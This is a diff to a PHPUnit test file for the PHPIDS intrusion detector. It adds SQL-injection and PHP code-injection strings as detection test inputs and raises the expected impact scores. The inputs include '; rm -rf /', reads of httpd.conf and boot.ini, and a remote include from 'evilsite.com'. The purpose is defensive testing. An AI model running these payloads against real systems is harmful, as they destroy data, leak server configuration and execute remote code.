@@ -206,13 +206,14 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
                   'SELECT LOAD_FILE(0x633A5C626F6F742E696E69)', 
                   'EXEC(@stored_proc @param)', 
                   'chr(11)||chr(12)||char(13)', 
-                  'MERGE INTO bonuses B USING (SELECT'
+                  'MERGE INTO bonuses B USING (SELECT', 
+                  '1 or name like \'%\''
                   ),
             $this->storage
         );
         $result = $test->run();
         $this->assertTrue($result->hasEvent(1));
-        $this->assertEquals(110, $result->getImpact());        
+        $this->assertEquals(117, $result->getImpact());        
     }
     
     public function testDTList(){
@@ -249,17 +250,23 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         );
         $result = $test->run();
         $this->assertTrue($result->hasEvent(1));
-        $this->assertEquals(238, $result->getImpact());          
+        $this->assertEquals(244, $result->getImpact());          
     }    
     
     public function testRFEList() {
         $test = new IDS_Monitor(
-            array(';phpinfo()', '"; <?php exec("rm -rf /"); ?>'),
+            array(';phpinfo()', 
+                  '"; <?php exec("rm -rf /"); ?>',
+                  '; file_get_contents(\'/usr/local/apache2/conf/httpd.conf\');',
+                  ';echo file_get_contents(implode(DIRECTORY_SEPARATOR, array("usr","local","apache2","conf","httpd.conf"))', 
+                  '; include "http://evilsite.com/evilcode"', 
+                  '; rm -rf /'
+                  ),
             $this->storage
         );
         $result = $test->run();
         $this->assertTrue($result->hasEvent(1));
-        $this->assertEquals(29, $result->getImpact());       
+        $this->assertEquals(90, $result->getImpact());       
     }
 
     public function testDecimalCCConverter() {
